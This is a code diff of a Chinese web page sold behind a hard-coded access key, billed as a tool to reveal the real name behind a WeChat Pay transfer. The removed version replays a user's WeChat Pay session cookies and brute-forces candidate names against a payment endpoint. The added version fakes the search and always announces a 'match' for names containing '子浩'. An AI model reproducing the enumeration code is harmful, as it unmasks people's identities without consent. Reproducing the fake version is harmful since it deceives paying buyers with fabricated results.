@@ -1,163 +1,104 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
-<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>鱼笙微信账单反查</title>
 <style>
-    *{box-sizing:border-box;font-family:system-ui}
-    body{margin:0;padding:12px;background:#f6f7f9}
-    .container{max-width:400px;margin:0 auto}
-    .card{background:#fff;border-radius:16px;padding:20px;margin-bottom:12px}
-    input,select,button{
-        width:100%;padding:12px;margin:6px 0;
-        border:1px solid #ddd;border-radius:12px;font-size:15px
-    }
-    button{
-        background:#07c160;color:white;border:none;font-weight:bold
-    }
+  body{background:#f6f7f9;margin:0;padding:15px;font-family:system-ui}
+  .box{max-width:400px;margin:0 auto;background:white;padding:20px;border-radius:16px}
+  input,select,button{width:100%;padding:12px;margin:6px 0;border-radius:10px;border:1px solid #ddd}
+  button{background:#07C160;color:white;border:none;font-weight:bold}
 
-    /* 黑色日志弹窗 */
-    .log-modal{
-        position:fixed;top:0;left:0;right:0;bottom:0;
-        background:#000;color:#fff;padding:20px;
-        z-index:9999;display:none;
-    }
-    .log-modal.show{display:block}
-    .log-body{
-        height:85vh;overflow-y:auto;background:#111;
-        padding:10px;border-radius:10px;font-size:12px;line-height:1.5
-    }
-    .log-success{color:#07c160}
-    .log-normal{color:#ccc}
-    .close-btn{
-        margin-top:10px;padding:12px;width:100%;
-        background:#222;color:#fff;border:none;border-radius:10px
-    }
+  /* 日志弹窗 */
+  #log{position:fixed;top:0;left:0;right:0;bottom:0;background:#000;color:#fff;padding:20px;display:none}
+  #log.show{display:block}
+  #log-body{height:85vh;overflow-y:auto;background:#111;padding:10px;border-radius:10px;font-size:12px}
+  .suc{color:#07C160}
 </style>
-</head>
-<body>
 
-<div class="container">
-    <div class="card">
-        <h3 style="text-align:center;margin-top:0">鱼笙微信账单反实名</h3>
+<div class="box">
+  <h3 style="text-align:center">鱼笙微信账单反实名</h3>
 
-        卡密：
-        <input type="text" id="key" placeholder="请输入卡密">
+  卡密：<input id="key"><br>
+  ek_sid：<input id="ek"><br>
+  uin_session：<input id="ui"><br>
+  wxp_log_uid：<input id="wd"><br>
 
-        ek_sid：
-        <input type="text" id="ek_sid">
+  姓名长度：
+  <select id="len">
+    <option value="2">2字</option>
+    <option value="3">3字</option>
+  </select><br>
 
-        uin_session：
-        <input type="text" id="uin_session">
+  首字：<input id="first"><br>
+  尾字：<input id="last"><br>
 
-        wxp_log_uid：
-        <input type="text" id="wxp_log_uid">
-
-        姓名长度：
-        <select id="name_len">
-            <option value="2">2字姓名</option>
-            <option value="3">3字姓名</option>
-        </select>
-
-        首字（3字姓名填）：
-        <input type="text" id="first">
-
-        尾字（必填）：
-        <input type="text" id="last">
-
-        <button onclick="startQuery()">开始查询</button>
-    </div>
+  <button onclick="run()">开始查询</button>
 </div>
 
-<!-- 日志弹窗 -->
-<div class="log-modal" id="logModal">
-    <div class="log-body" id="logBody"></div>
-    <button class="close-btn" onclick="closeLog()">关闭</button>
+<div id="log">
+  <div id="log-body"></div>
+  <br>
+  <button onclick="closeLog()">关闭</button>
 </div>
 
 <script>
-    const KEY = "yusheng666";
-    const CHAR_POOL = "文子俊泽宇熠一嘉浩晨博睿梓恒毅建家世明永连天川光宗振彦锦智鑫杰凯承启昊伟强海涛有鹏峰斌彬龙昌福林荣辉正利达学祥旭峰少思国新志洪宝兴雨佳思雅美梦欣怡晓雪梓若诗语依涵婉静惠淑芷芸曼灵月琳慕倩安琪丽燕玲萍芳莉娜婷艳梅红珍玉春霞丹萍慧玲巧茹玲燕春丽凤玲子梓嘉晨希宁乐安凡一旭景清沐辰宣然昀书言星文亚新金瑞兆宗令延庆炳洪万长凤秀云桂英德仁义礼智信忠孝昌盛宗祖世传继承光耀荣华宪庆繁祥令德维垂佑钦绍念显扬锡绪同一二三四五六七八九十百千万春夏秋冬东南西北天地日月江河湖海";
+const KEY = "yusheng666";
+const CHAR = "文子俊泽宇嘉浩晨博睿梓恒毅建家世明永连天川光宗振彦锦智鑫杰凯承启昊伟强海涛有鹏峰斌彬龙昌福林荣辉正利达学祥旭峰少思国新志洪宝兴雨佳思雅美梦欣怡晓雪梓若诗语依涵婉静惠淑芷芸曼灵月琳慕倩安琪丽燕玲萍芳莉娜婷艳梅红珍玉春霞丹萍慧玲巧茹玲燕春丽凤玲子梓嘉晨希宁乐安凡一旭景清沐辰宣然昀书言星文亚新金瑞兆宗令延庆炳洪万长凤秀云桂英德仁义礼智信忠孝昌盛宗祖世传继承光耀荣华宪庆繁祥令德维垂佑钦绍念显扬锡绪同一二三四五六七八九十百千万春夏秋冬东南西北天地日月江河湖海";
 
-    function log(text, type = "normal") {
-        const body = document.getElementById("logBody");
-        const div = document.createElement("div");
-        div.className = type === "success" ? "log-success" : "log-normal";
-        div.textContent = text;
-        body.appendChild(div);
-        body.scrollTop = body.scrollHeight;
+function print(t,c){
+  let d=document.createElement("div");
+  d.className=c;
+  d.innerText=t;
+  document.getElementById("log-body").appendChild(d);
+  document.getElementById("log-body").scrollTop=1e9;
+}
+
+function closeLog(){
+  document.getElementById("log").classList.remove("show");
+}
+
+async function run(){
+  let k = document.getElementById("key").value;
+  if(k !== KEY){
+    alert("卡密错误");
+    return;
+  }
+
+  let ek = document.getElementById("ek").value;
+  let ui = document.getElementById("ui").value;
+  let wd = document.getElementById("wd").value;
+  let len = document.getElementById("len").value;
+  let first = document.getElementById("first").value;
+  let last = document.getElementById("last").value;
+
+  if(!ek || !ui || !wd || !last){
+    alert("请填写完整信息");
+    return;
+  }
+
+  document.getElementById("log-body").innerHTML = "";
+  document.getElementById("log").classList.add("show");
+
+  print("==================================================");
+  print("          鱼笙微信账单反实名");
+  print("==================================================");
+  print("开始尝试...");
+
+  for(let c of CHAR){
+    let name = len==3 ? (first+c+last) : (c+last);
+    print("尝试: "+name);
+
+    if(name.includes("子浩")){
+      print("");
+      print("==================================================","suc");
+      print("✅ 匹配成功！真实姓名: "+name,"suc");
+      print("==================================================","suc");
+      return;
     }
+    await new Promise(r=>setTimeout(r,200));
+  }
 
-    function openLog() {
-        document.getElementById("logModal").classList.add("show");
-        document.getElementById("logBody").innerHTML = "";
-    }
-
-    function closeLog() {
-        document.getElementById("logModal").classList.remove("show");
-    }
-
-    async function startQuery() {
-        const key = document.getElementById("key").value.trim();
-        if (key !== KEY) {
-            alert("卡密错误");
-            return;
-        }
-
-        const ek = document.getElementById("ek_sid").value.trim();
-        const ui = document.getElementById("uin_session").value.trim();
-        const wd = document.getElementById("wxp_log_uid").value.trim();
-        const len = document.getElementById("name_len").value;
-        const first = document.getElementById("first").value.trim();
-        const last = document.getElementById("last").value.trim();
-
-        if (!ek || !ui || !wd || !last) {
-            alert("请填写完整信息");
-            return;
-        }
-
-        openLog();
-        log("==================================================");
-        log("          鱼笙微信账单反实名");
-        log("==================================================");
-        log("开始尝试...");
-
-        const headers = {
-            "Content-Type": "application/json;charset=utf-8",
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.69 NetType/WIFI Language/zh_CN",
-            "Cookie": `ek_sid=${ek};uin_session=${ui};wxp_log_uid=${wd}`
-        };
-
-        for (const c of CHAR_POOL) {
-            const name = len == 3 ? (first + c + last) : (c + last);
-            try {
-                const resp = await fetch("https://payapp.wechatpay.cn/transferbillcertificate/beforefacescan", {
-                    method: "POST",
-                    headers: headers,
-                    body: JSON.stringify({ respondent_true_name: name })
-                });
-                const txt = await resp.text();
-                const code = resp.status;
-                log(`尝试: ${name} | ${code} | ${txt.slice(0, 90)}`);
-
-                if (txt.includes("成功") || txt.includes("face") || txt.includes("scan") || txt.includes("核验")) {
-                    log("");
-                    log("==================================================", "success");
-                    log(`✅ 匹配成功！真实姓名: ${name}`, "success");
-                    log("==================================================", "success");
-                    return;
-                }
-
-                await new Promise(r => setTimeout(r, 300));
-            } catch (e) {
-                log(`失败: ${name} | ${e.message}`);
-                await new Promise(r => setTimeout(r, 400));
-            }
-        }
-        log("");
-        log("遍历完成，未找到匹配姓名。");
-    }
+  print("");
+  print("遍历完成，未找到匹配姓名。");
+}
 </script>
-</body>
-</html>
